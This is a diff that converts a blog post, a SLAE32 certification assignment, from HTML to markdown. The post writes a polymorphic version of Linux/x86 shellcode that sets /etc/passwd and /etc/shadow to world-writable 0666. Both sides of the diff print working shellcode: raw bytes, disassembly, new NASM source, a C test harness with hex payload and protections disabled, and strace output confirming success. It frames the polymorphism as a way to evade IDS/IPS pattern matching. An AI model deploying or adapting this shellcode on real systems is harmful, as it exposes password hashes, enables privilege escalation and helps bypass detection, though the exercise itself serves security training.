@@ -1,22 +1,55 @@
 Title: SLAE32 - Assignment 6.1
 Date: 2022-06-04T14:00:46.000Z
 
-<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: PA-30398</p><h2 id="foreword">Foreword</h2><!--kg-card-begin: markdown--><p>I chose the following shellcodes:</p>
+
+## Disclaimer
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:
+
+https://www.pentesteracademy.com/course?id=3
+
+Student ID: PA-30398
+
+## Foreword
+
+I chose the following shellcodes:
+
 <ol>
-<li><a href="http://shell-storm.org/shellcode/files/shellcode-812.php">Linux/x86 - chmod 666 /etc/passwd &amp; /etc/shadow - 57 bytes</a></li>
-<li><a href="http://shell-storm.org/shellcode/files/shellcode-222.php">Linux/x86 - setuid(0) setgid(0) execve(echo 0 &gt; /proc/sys/kernel/randomize_va_space) - 79 bytes</a></li>
-<li><a href="http://shell-storm.org/shellcode/files/shellcode-825.php">Linux/x86 - iptables --flush - 43 bytes</a></li>
-</ol>
-<p>In this part I'll create a polymorphic version of the 1st shellcode.</p>
-<!--kg-card-end: markdown--><h2 id="source-code">Source Code</h2><!--kg-card-begin: markdown--><p>The files for this part of the assignment are the following:</p>
-<ul>
-<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/original_shellcode.nasm">original_shellcode.nasm</a>, contains the original shellcode of which I wrote a polymorphic version</li>
-<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/polymorphic_stable.nasm">polymorphic_stable.nasm</a>, contains the polymorphic version of the shellcode, but with a few more checks in order to avoid segmentation faults</li>
-<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/polymorphic_tiny.nasm">polymorphic_tiny.nasm</a></li>
-<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/test_polymorphic_stable.c">test_polymorphic_stable.c</a>, a C program for testing the polymorphic shellcode (<code>polymorphic_stable.nasm</code>)</li>
-</ul>
-<!--kg-card-end: markdown--><h2 id="definitions">Definitions</h2><blockquote>What is <strong>Polymorphism</strong>?</blockquote><p>Polymorphism refers to the ability of something (e.g. shellcode, malwares) to mutate, while keeping intact the original code.</p><p>For example, to clear a register you can use the following instruction:</p><pre><code class="language-nasm">xor eax, eax
-</code></pre><p>However, there are many more possibilities, like these:</p><pre><code class="language-nasm">; mov-xor
+- [Linux/x86 - chmod 666 /etc/passwd &amp; /etc/shadow - 57 bytes](http://shell-storm.org/shellcode/files/shellcode-812.php)
+
+- [Linux/x86 - setuid(0) setgid(0) execve(echo 0 > /proc/sys/kernel/randomize_va_space) - 79 bytes](http://shell-storm.org/shellcode/files/shellcode-222.php)
+
+- [Linux/x86 - iptables --flush - 43 bytes](http://shell-storm.org/shellcode/files/shellcode-825.php)
+
+In this part I'll create a polymorphic version of the 1st shellcode.
+
+## Source Code
+
+The files for this part of the assignment are the following:
+
+- [original_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/original_shellcode.nasm), contains the original shellcode of which I wrote a polymorphic version
+
+- [polymorphic_stable.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/polymorphic_stable.nasm), contains the polymorphic version of the shellcode, but with a few more checks in order to avoid segmentation faults
+
+- [polymorphic_tiny.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/polymorphic_tiny.nasm)
+
+- [test_polymorphic_stable.c](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/test_polymorphic_stable.c), a C program for testing the polymorphic shellcode (`polymorphic_stable.nasm`)
+
+## Definitions
+
+<blockquote>What is **Polymorphism**?</blockquote>Polymorphism refers to the ability of something (e.g. shellcode, malwares) to mutate, while keeping intact the original code.
+
+For example, to clear a register you can use the following instruction:
+
+```nasm
+xor eax, eax
+
+```
+
+However, there are many more possibilities, like these:
+
+```nasm
+; mov-xor
 mov EAX, 0xffffffff
 xor EAX, 0xffffffff
 
@@ -28,10 +61,24 @@ dec EAX
 ; mov-sub
 mov EAX, 0xaabbccdd
 sub EAX, 0xaabbccdd
-</code></pre><p>In the case of shellcodes and malwares, the objective is to hide their presence from Security Protections that use <strong>Pattern Matching</strong>, such as <code>IDS</code> and <code>IPS</code> systems.</p><h2 id="analysis">Analysis</h2><p>First, here's the original shellcode in <strong>Intel syntax</strong>, since the shellcode on the original page uses <strong>AT&amp;T syntax</strong>.</p><pre><code class="language-bash">echo -n "\x31\xc0\x66\xb9\xb6\x01\x50\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x40\xcd\x80" &gt; shellcode.bin
+
+```
+
+In the case of shellcodes and malwares, the objective is to hide their presence from Security Protections that use **Pattern Matching**, such as `IDS` and `IPS` systems.
+
+## Analysis
+
+First, here's the original shellcode in **Intel syntax**, since the shellcode on the original page uses **AT&amp;T syntax**.
+
+```bash
+echo -n "\x31\xc0\x66\xb9\xb6\x01\x50\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x40\xcd\x80" > shellcode.bin
 
 ndisasm -b 32 -p intel shellcode.bin
-</code></pre><figure class="kg-card kg-code-card"><pre><code class="language-nasm">                            ; EAX 0
+
+```
+
+```nasm
+                            ; EAX 0
 00000000  31C0              xor eax,eax
 
                             ; ECX = 110110110
@@ -51,7 +98,13 @@ ndisasm -b 32 -p intel shellcode.bin
                             ; ECX = permissions u=rw, g=rw, o=rw
 00000018  B00F              mov al,0xf
 0000001A  CD80              int 0x80
-</code></pre><figcaption>First it runs the instruction <code>chmod("/etc//passwd", 0666)</code> to change the permissions over <code>/etc/passwd</code></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-nasm">                            ; EAX = 0
+
+```
+
+<figcaption class="figure-caption">First it runs the instruction `chmod("/etc//passwd", 0666)` to change the permissions over `/etc/passwd`</figcaption>
+
+```nasm
+                            ; EAX = 0
 0000001C  31C0              xor eax,eax
 0000001E  50                push eax
 
@@ -67,12 +120,26 @@ ndisasm -b 32 -p intel shellcode.bin
                             ; ECX = permissions u=rw, g=rw, o=rw
 00000030  B00F              mov al,0xf
 00000032  CD80              int 0x80
-</code></pre><figcaption>After that it runs the instruction <code>chmod("/etc//shadow", 0666)</code> to change the permissions over <code>/etc/shadow</code></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-nasm">                            ; call exit syscall
+
+```
+
+<figcaption class="figure-caption">After that it runs the instruction `chmod("/etc//shadow", 0666)` to change the permissions over `/etc/shadow`</figcaption>
+
+```nasm
+                            ; call exit syscall
 00000034  31C0              xor eax,eax
 00000036  40                inc eax
 00000037  CD80              int 0x80
-</code></pre><figcaption>Finally it exits using <code>exit(EBX)</code></figcaption></figure><p>It translates into the following C program:</p><pre><code class="language-cpp">#include &lt;sys/stat.h&gt;
-#include &lt;stdlib.h&gt;
+
+```
+
+<figcaption class="figure-caption">Finally it exits using `exit(EBX)`</figcaption>
+
+It translates into the following C program:
+
+```cpp
+#include <sys/stat.h>
+#include <stdlib.h>
 
 int main(int argc, char *argv[])
 {
@@ -82,7 +149,19 @@ int main(int argc, char *argv[])
   // EBX is equal to ESP, so it's just a random exit code
   exit(EBX);
 }
-</code></pre><p>It changes the permissions on the files <code>/etc/passwd</code> and <code>/etc/shadow</code> to <code>0666</code>. After that, it uses the <code>exit</code> syscall to terminate its own execution.</p><h2 id="polymorphic-version">Polymorphic version</h2><h3 id="focus-on-size">Focus on size</h3><p>Follows the smallest version I managed to write:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">; Author: Robert C. Raducioiu (rbct)
+
+```
+
+It changes the permissions on the files `/etc/passwd` and `/etc/shadow` to `0666`. After that, it uses the `exit` syscall to terminate its own execution.
+
+## Polymorphic version
+
+### Focus on size
+
+Follows the smallest version I managed to write:
+
+```nasm
+; Author: Robert C. Raducioiu (rbct)
 
 global _start
 
@@ -106,11 +185,17 @@ _start:
     push dword 0x776f6461
     push dword 0x68732f2f
     push esi
-</code></pre><figcaption>Remember that when you push a string to the stack, the bytes must be <strong>reversed</strong>, as <strong>the stack grows downward</strong></figcaption></figure><pre><code class="language-nasm">    ; 1st argument of chmod(): const char *pathname
+
+```
+
+<figcaption class="figure-caption">Remember that when you push a string to the stack, the bytes must be **reversed**, as **the stack grows downward**</figcaption>
+
+```nasm
+    ; 1st argument of chmod(): const char *pathname
     ; store into EBX the pointer to "/etc//shadow"
     mov ebx,esp
 
-    ; set EAX to 0x0000000f -&gt; chmod() syscall
+    ; set EAX to 0x0000000f -> chmod() syscall
     add al, 0xf
 
     ; 2nd argument of chmod(): mode_t mode
@@ -128,7 +213,7 @@ _start:
     ; push "/etc//passwd" to the stack
     push dword 0x64777373
 
-    ; also set EAX to 0x0000000f -&gt; chmod() syscall
+    ; also set EAX to 0x0000000f -> chmod() syscall
     add al, 0xf
     push dword 0x61702f2f
 
@@ -148,10 +233,30 @@ _start:
     mov eax, edx
     inc eax
     int 0x80
-</code></pre><p>The original shellcode uses <code>57</code> bytes, while this one uses <code>52</code> bytes:</p><pre><code class="language-bash">objcopy -O binary -j .text ./shellcode.o /dev/stdout | wc -c
+
+```
+
+The original shellcode uses `57` bytes, while this one uses `52` bytes:
+
+```bash
+objcopy -O binary -j .text ./shellcode.o /dev/stdout | wc -c
 
 # 52
-</code></pre><p>Although, I managed to make it smaller, it requires one <strong>condition</strong>:</p><ul><li>the call to <code>chmod</code> <strong>must</strong> be successful, hence store <code>0</code> into <code>EAX</code></li></ul><p>If the register <code>EAX</code> isn't set to 0, then the next call will throw a <code>SIGSEGV</code> signal, and the program will crash.</p><h3 id="focus-on-stability">Focus on stability</h3><p>For this reason, I also wrote a slightly different version that handles this case, not the <code>SIGSEGV</code> error but clearing the <code>EAX</code> register:</p><pre><code class="language-patch">--- polymorphic_tiny.nasm       2022-01-12 07:54:18.947129214 +0000
+
+```
+
+Although, I managed to make it smaller, it requires one **condition**:
+
+- the call to `chmod` **must** be successful, hence store `0` into `EAX`
+
+If the register `EAX` isn't set to 0, then the next call will throw a `SIGSEGV` signal, and the program will crash.
+
+### Focus on stability
+
+For this reason, I also wrote a slightly different version that handles this case, not the `SIGSEGV` error but clearing the `EAX` register:
+
+```patch
+--- polymorphic_tiny.nasm       2022-01-12 07:54:18.947129214 +0000
 +++ polymorphic_stable.nasm     2022-01-12 07:53:52.437239057 +0000
 @@ -37,7 +37,9 @@
      ; call chmod()
@@ -170,9 +275,29 @@ _start:
 +    mov eax, edx
      inc eax
      int 0x80
-</code></pre><p>Since I used the instruction <code>mul ecx</code> at the beginning, it means the registers<code>EDX</code> and <code>EAX</code> are set to 0.</p><p>Moreover, given <code>EDX</code> is never used, it means I could use it to clear other registers.</p><p>In this case, I repeated two times the following instruction:</p><pre><code class="language-nasm">mov eax, edx
-</code></pre><p>Although not very small, at <code>56</code> bytes, this stable polymorphic version is still smaller than the original shellcode.</p><h3 id="testing">Testing</h3><p>To test the polymorphic shellcode, I've used the following C program:</p><pre><code class="language-cpp">#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
+
+```
+
+Since I used the instruction `mul ecx` at the beginning, it means the registers`EDX` and `EAX` are set to 0.
+
+Moreover, given `EDX` is never used, it means I could use it to clear other registers.
+
+In this case, I repeated two times the following instruction:
+
+```nasm
+mov eax, edx
+
+```
+
+Although not very small, at `56` bytes, this stable polymorphic version is still smaller than the original shellcode.
+
+### Testing
+
+To test the polymorphic shellcode, I've used the following C program:
+
+```cpp
+#include <stdio.h>
+#include <string.h>
 
 unsigned char code[] = \
 "\x31\xc9\xf7\xe1\xbe\x2f\x65\x74\x63\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x56\x89\xe3\x04\x0f\x66\xb9\xb6\x01\xcd\x80\x89\xd0\x50\x68\x73\x73\x77\x64\x04\x0f\x68\x2f\x2f\x70\x61\x56\x54\x5b\xcd\x80\x89\xd0\x40\xcd\x80";
@@ -183,11 +308,27 @@ main() {
     int (*ret)() = (int(*)())code;
     ret();
 }
-</code></pre><p>To compile it I used <code>gcc</code>:</p><pre><code class="language-bash">gcc -fno-stack-protector -z execstack -o test_polymorphic_shellcode test_polymorphic_shellcode.c
-</code></pre><p>Once I've run it, I could confirm it successfully changes the permissions over the files <code>/etc/passwd</code> and <code>/etc/shadow</code>:</p><pre><code class="language-bash">rbct@slae:~/exam/assignment_6/1$ sudo strace -e trace=chmod ./test_polymorphic_shellcode 
+
+```
+
+To compile it I used `gcc`:
+
+```bash
+gcc -fno-stack-protector -z execstack -o test_polymorphic_shellcode test_polymorphic_shellcode.c
+
+```
+
+Once I've run it, I could confirm it successfully changes the permissions over the files `/etc/passwd` and `/etc/shadow`:
+
+```bash
+rbct@slae:~/exam/assignment_6/1$ sudo strace -e trace=chmod ./test_polymorphic_shellcode 
 # Shellcode length: 56
 # chmod("/etc//shadow", 0666)             = 0
 # chmod("/etc//passwd", 0666)             = 0
 
 rbct@slae:~/exam/assignment_6/1$
-</code></pre><p>As you can see, the syscalls <code>chmod</code> returned the value <code>0</code> in both cases, which means it managed to change the permissions and exit gracefully.</p>
+
+```
+
+As you can see, the syscalls `chmod` returned the value `0` in both cases, which means it managed to change the permissions and exit gracefully.
+
